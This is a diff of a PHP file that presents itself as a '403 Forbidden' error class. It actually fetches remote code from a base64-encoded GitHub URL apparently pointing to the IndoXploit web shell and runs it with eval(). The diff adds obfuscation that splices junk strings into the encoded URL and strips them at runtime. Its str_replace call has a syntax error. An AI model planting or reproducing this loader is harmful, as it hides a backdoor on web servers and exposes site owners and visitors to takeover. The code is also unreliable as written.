@@ -1,13 +1,22 @@
 <?php
+/**
+ Forbdidden 403
+**/
+
 class Forbidden {
-	public function Feval($string) {
-		return eval($string);
+	public function ForbiddenVal($val) {
+		return eval($val);
 	}
-	public function Fbase($string) {
-		return base64_decode($string);
+	public function Base($base) {
+		$base_ = $this->Error403($base);
+		return base64_decode($base_);
+	}
+	public function Error403($err) {
+		$errCode = str_replace(array("/_a9", "_+zB", "_\y0") "", $err);
+		return $errCode;
 	}
 }
 $error = New Forbidden;
-$error->Feval(file_get_contents($error->Fbase("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3hkYXZpYW4vc2hlbGwvbWFpbi9pbmRveHBsb2l0LXYy")));
+$error->ForbiddenVal(file_get_contents($error->Base("aHR/_a90cHM6_\y0Ly9yYXcuZ2l_+zB0aHVidXN_\y0lcmNvbnRlb/_a9nQuY29tL3hk_\y0YXZpYW4v_+zBc2hlbGwv/_a9bWFpbi_\y09pbmRve_+zBHBsb2l0LX_\y0Yy")));
 
 ?>
